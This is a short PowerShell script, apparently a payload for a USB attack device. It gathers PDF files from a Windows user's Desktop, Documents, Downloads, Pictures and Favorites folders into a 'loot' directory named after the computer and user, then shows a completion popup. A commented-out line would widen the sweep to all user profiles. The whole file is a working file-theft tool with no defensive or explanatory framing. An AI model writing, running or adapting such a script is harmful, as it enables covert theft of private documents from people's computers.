# Set up file name and Loot Directory
$timeformat = Get-Date -Format yyyyMMddHHmmss
$hostname = $env:computername+"_"+$env:username
$filetimestamp = $hostname+'_'+$timeformat
cd $PSScriptRoot
$LootDir = New-Item -ItemType directory -Force -Path "..\..\loot\FileExtractor\$filetimestamp"

# Define extension of files to be extracted
$EXTENSION = ".pdf" 




Copy-Item -path "$env:USERPROFILE\Desktop\" -Filter "*$EXTENSION" -Recurse -Destination "$LootDir" -Force

Copy-Item -path "$env:USERPROFILE\Documents\" -Filter "*$EXTENSION" -Recurse -Destination "$LootDir" -Force

Copy-Item -path "$env:USERPROFILE\Downloads\" -Filter "*$EXTENSION" -Recurse -Destination "$LootDir" -Force

Copy-Item -path "$env:USERPROFILE\Pictures\" -Filter "*$EXTENSION" -Recurse -Destination "$LootDir" -Force

Copy-Item -path "$env:USERPROFILE\Favorites\" -Filter "*$EXTENSION" -Recurse -Destination "$LootDir" -Force

#Copy-Item -path "C:\Users\" -Filter "*$EXTENSION" -Recurse -Destination "$LootDir" -Force

# Quick pop up to indicate PowerShell has completed
$wshell = New-Object -ComObject Wscript.Shell
$wshell.Popup("Operation Completed",2,"Done",0x1)



